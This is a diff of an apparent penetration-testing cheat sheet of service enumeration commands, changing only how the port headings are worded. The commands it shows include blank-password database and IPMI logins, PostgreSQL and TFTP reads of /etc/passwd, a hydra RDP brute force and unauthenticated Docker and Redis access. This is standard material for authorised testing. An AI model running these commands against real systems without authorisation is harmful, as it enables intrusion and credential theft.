@@ -93,7 +93,7 @@ curl -k https://$rhost
 sslscan $rhost:443
 wafw00f -v https://$domain
 
-### MSSQL (Port 1433)
+### MSSQL 1433 (Port)
 sqsh -S $rhost -U sa -P ""
 nmap -sV -p1433 --script ms-sql-info -Pn $rhost
 
@@ -103,7 +103,7 @@ mysql -h $rhost -u "" -p""
 nmap -sV -p3306 --script mysql-info,mysql-variables -Pn $rhost
 nmap -sV -p3306 --script mysql-databases -Pn $rhost
 
-### PostgreSQL (Port 5432)
+### PostgreSQL 5432 (Port)
 psql -h $rhost -U postgres
 psql -h $rhost -U postgres -c "COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT"
 psql -h $rhost -U postgres -c "COPY (SELECT pg_read_file('C:\\Windows\\win.ini')) TO STDOUT"
@@ -116,37 +116,37 @@ qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost rd
 redis-cli -h $rhost
 redis-cli -h $rhost keys *
 
-### NFS (Port 2049)
+### NFS 2049 (Port)
 showmount -e $rhost
 
-### SNMP (Port 161)
+### SNMP  161 (Port)
 snmpwalk -v1 -c public $rhost
 qterminal -e "zsh -c 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $rhost; exec zsh'" & disown
 
-### Elasticsearch (Port 9200)
+### Elasticsearch 9200 (Port)
 curl -s http://$rhost:9200/_cat/indices
 curl -s http://$rhost:9200/_cluster/health
 
-### MongoDB (Port 27017)
+### MongoDB 27017 (Port)
 mongo --host $rhost --eval "db.version()"
 mongo --host $rhost --eval "db.getCollectionNames()"
 
-### CouchDB (Port 5984)
+### CouchDB 5984 (Port)
 curl -s http://$rhost:5984/_all_dbs
 curl -s http://$rhost:5984/_utils/
 
-### Docker (Port 2375)
+### Docker 2375 (Port)
 docker -H tcp://$rhost:2375 ps
 docker -H tcp://$rhost:2375 images
 
-### IPMI (Port 623)
+### IPMI 623 (Port)
 ipmitool -I lanplus -C 0 -H $rhost -U "" -P "" user list (IPMI user enumeration)
 nmap -sU -p623 --script ipmi-version.nse $rhost
 
-### Rsync (Port 873)
+### Rsync 873 (Port)
 rsync rsync://$rhost
 
-### CoAP (Port 5683)
+### CoAP 5683 (Port)
 coap-client -m get "coap://$rhost:5683/.well-known/core" 
 TFTP (Port 69)
 tftp $rhost → get /etc/passwd
